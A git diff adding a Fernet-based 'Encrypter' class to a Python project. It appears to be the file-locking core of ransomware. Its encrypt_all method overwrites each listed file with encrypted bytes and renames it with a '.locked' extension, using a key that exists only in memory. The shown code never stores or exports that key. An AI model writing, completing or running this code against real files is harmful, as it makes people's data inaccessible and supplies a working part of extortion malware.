@@ -26,28 +26,71 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
+import logging
 from pathlib import Path
+
+from cryptography.fernet import Fernet
+
+logger = logging.getLogger(__name__)
 
 
 class Encrypter:
+    """
+    A class for encrypting and decrypting files and
+    bytes using the Fernet symmetric encryption scheme.
+    """
 
     def __init__(self) -> None:
-        pass
+        self.key: bytes = self.gen_key()
+        self.fernet: Fernet = Fernet(self.key)
+        logger.info("Encryption key generated.")
 
-    def gen_keys(self) -> None:
-        pass
+    def gen_key(self) -> bytes:
+        """
+        Generates a new encryption key for the Fernet encryption.
 
-    def encrypt(self, file_bytes: bytes) -> bytes:
-        pass
+        Returns:
+            bytes: A newly generated encryption key.
+        """
+        return Fernet.generate_key()
 
-    def decrypt(self) -> bytes:
-        pass
+    def encrypt_all(self, files: list[Path]) -> None:
+        """
+        Encrypts all files provided in the list and renames
+        them by appending the '.locked' extension.
 
-    def get_file_bytes(self, file: Path) -> bytes:
-        pass
+        Args:
+            files (list[Path]): A list of file paths to be encrypted.
+        """
+        for file in files:
+            try:
+                logger.info("Trying to encrypt %s", file.name)
+                file.write_bytes(self.encrypt_bytes(file.read_bytes()))
+                file.rename(file.name + ".locked")
+                logger.info("Encrypted %s succesfully", file.name)
+            except PermissionError as e:
+                logger.error("Permission denied, skipping: %s. %s", file.name, e)
 
-    # def __enter__(self) -> None:
-    #    pass
-    #
-    # def __exit__(self, exception_type, exception_value, exception_traceback) -> None:
-    #    pass
+    def encrypt_bytes(self, file_bytes: bytes) -> bytes:
+        """
+        Encrypts the given byte content using the Fernet encryption scheme.
+
+        Args:
+            file_bytes (bytes): The byte content to be encrypted.
+
+        Returns:
+            bytes: The encrypted byte content.
+        """
+        return self.fernet.encrypt(file_bytes)
+
+    def decrypt_bytes(self, encrypted_bytes: bytes) -> bytes:
+        """
+        Decrypts the given encrypted byte content using the Fernet encryption scheme.
+
+        Args:
+            encrypted_bytes (bytes): The encrypted byte content to be decrypted.
+
+        Returns:
+            bytes: The decrypted byte content.
+        """
+        return self.fernet.decrypt(encrypted_bytes)
